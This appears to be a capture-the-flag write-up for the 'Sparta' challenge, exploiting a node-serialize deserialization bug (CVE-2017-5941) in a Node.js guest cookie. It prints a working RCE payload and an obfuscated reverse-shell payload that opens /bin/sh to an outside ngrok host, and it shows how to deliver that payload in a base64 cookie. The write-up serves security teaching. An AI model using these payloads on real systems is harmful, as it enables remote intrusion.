---
description: node.js deserialization vulnerability leads to RCE.
---

# Sparta

## Problem

Spartanians are starting to lose their great power, help them move their objects and rebuild their Empire.

## Solution

In the given source code, we can see that the `/guest` endpoint deserializes the base 64 decoded `guest` cookie.

```javascript
app.post('/guest', function(req, res) {
   if (req.cookies.guest) {
       var str = new Buffer(req.cookies.guest, 'base64').toString();
       var obj = serialize.unserialize(str);
       if (obj.username) {
         res.send("Hello " + escape(obj.username) + ". This page is currently under maintenance for Guest users. Please go back to the login page");
   }
 } else {
     var username = req.body.username 
     var country = req.body.country 
     var city = req.body.city
     var serialized_info = `{"username":"${username}","country":"${country}","city":"${city}"}`
     var encoded_data = new Buffer(serialized_info).toString('base64');
     res.cookie('guest', encoded_data, {
       maxAge: 900000,
       httpOnly: true
     });
 }
```

There is a well-known deserialization vulnerability in node.js that leads to RCE ([CVE-2017-5941](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)).

By passing a serialized object like the following into `serialize.unserialize()`, we can achieve RCE.

```javascript
{"rce":"_$$ND_FUNC$$_function (){\n \t
require('child_process').exec('ls /', function(error, stdout, stderr) {
console.log(stdout) });\n }()"}
```

This relies on JavaScript's Immediately Invoked Function Expression (IIFE): notice the IIFE bracket after the function expression:

```javascript
function (){ ... }()
```

Now, we can execute a reverse shell payload within the function that would be fired when the data is deserialized. Using [nodejsshell.py,](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) we can craft such a payload.

In my case: `python nodejsshell.py 2.tcp.ngrok.io 13755` allowed me to generate a reverse shell payload for my ngrok tunnel.

![](<../../.gitbook/assets/image (2) (1) (1).png>)

Then, we can copy the output into the function body.

```javascript
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,50,46,116,99,112,46,110,103,114,111,107,46,105,111,34,59,10,80,79,82,84,61,34,49,51,55,53,53,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}';
serialize.unserialize(payload);
```

Once we tested that our payload works, we can encode the payload to base 64, and send it through the cookie header.

![](<../../.gitbook/assets/image (3) (1).png>)

We obtain a reverse shell, which allows us to read the flag.

![](<../../.gitbook/assets/image (4).png>)

## References:

1. [https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
2. [https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)
